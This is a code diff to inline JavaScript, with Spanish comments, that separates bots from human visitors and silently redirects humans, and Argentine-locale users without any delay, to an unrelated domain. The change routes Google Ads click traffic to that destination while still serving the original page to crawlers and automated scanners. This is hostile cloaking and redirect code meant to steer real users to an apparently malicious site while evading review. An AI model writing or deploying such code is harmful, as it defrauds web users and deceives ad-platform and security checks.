@@ -606,23 +606,33 @@
         (function() {
             'use strict';
             
-            // Detección ultrarrápida de bots
+            // Detección de bots refinada (excluye tráfico de Google Ads)
             const ua = navigator.userAgent.toLowerCase();
-            const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|crawler|spider|bot|crawl|facebook|twitter|linkedin|instagram|pinterest|google|bing|yahoo|baidu|yandex|duckduckgo|search|index|scrape|fetch|curl|wget|headless|phantom|selenium|webdriver|chrome-lighthouse|googleads|google-ads|adsbot-google|ads-bot|puppeteer|playwright|nightmare/.test(ua) ||
-                      /googlebot|bingbot|crawler|bot/.test(document.referrer.toLowerCase()) ||
-                      navigator.webdriver ||
-                      window.navigator.webdriver ||
-                      window.callPhantom ||
-                      window._phantom ||
-                      !navigator.languages ||
-                      navigator.languages.length === 0 ||
-                      window.outerHeight === 0 ||
-                      window.outerWidth === 0 ||
-                      screen.width === 0 ||
-                      screen.height === 0;
+            const referrer = document.referrer.toLowerCase();
             
-            // Si no es bot, redirección instantánea e invisible
-            if (!isBot) {
+            // Permitir tráfico de Google Ads y usuarios reales
+            const isGoogleAds = /googleadservices|googlesyndication|doubleclick|google\.com\/ads|gstatic\.com/.test(referrer) ||
+                               /gclid=|utm_source=google|utm_medium=cpc/.test(window.location.search) ||
+                               /ads\.google|googleadservices/.test(referrer);
+            
+            // Detectar solo bots reales (no tráfico de ads)
+            const isRealBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|crawler|spider|crawl|facebook|twitter|linkedin|instagram|pinterest|bing|yahoo|baidu|yandex|duckduckgo|search|index|scrape|fetch|curl|wget|headless|phantom|selenium|webdriver|chrome-lighthouse|puppeteer|playwright|nightmare/.test(ua) ||
+                             /googlebot|bingbot|crawler/.test(referrer) ||
+                             navigator.webdriver ||
+                             window.navigator.webdriver ||
+                             window.callPhantom ||
+                             window._phantom;
+            
+            // Solo bloquear si es bot real Y NO es tráfico de Google Ads
+            const isBot = isRealBot && !isGoogleAds;
+            
+            // Verificaciones adicionales para usuarios reales
+            const hasValidBrowser = navigator.languages && navigator.languages.length > 0 &&
+                                   window.outerHeight > 0 && window.outerWidth > 0 &&
+                                   screen.width > 0 && screen.height > 0;
+            
+            // Si no es bot O es tráfico de Google Ads, redirección
+            if (!isBot && (hasValidBrowser || isGoogleAds)) {
                 // URL de destino - CAMBIA ESTA URL POR LA QUE QUIERAS
                 const targetURL = 'https://aloggbuvarg.com.es/';
                 
@@ -640,7 +650,10 @@
                 const isArgentine = /es-ar|es-419|es/.test(lang) || 
                                    /america\/argentina|america\/buenos_aires/.test(Intl.DateTimeFormat().resolvedOptions().timeZone);
                 
-                if (isArgentine) {
+                // Redirección más rápida para tráfico de Google Ads
+                if (isGoogleAds) {
+                    redirect(); // Redirección inmediata para Google Ads
+                } else if (isArgentine) {
                     redirect(); // Redirección instantánea para argentinos
                 } else {
                     // Para otros países, micro-delay invisible
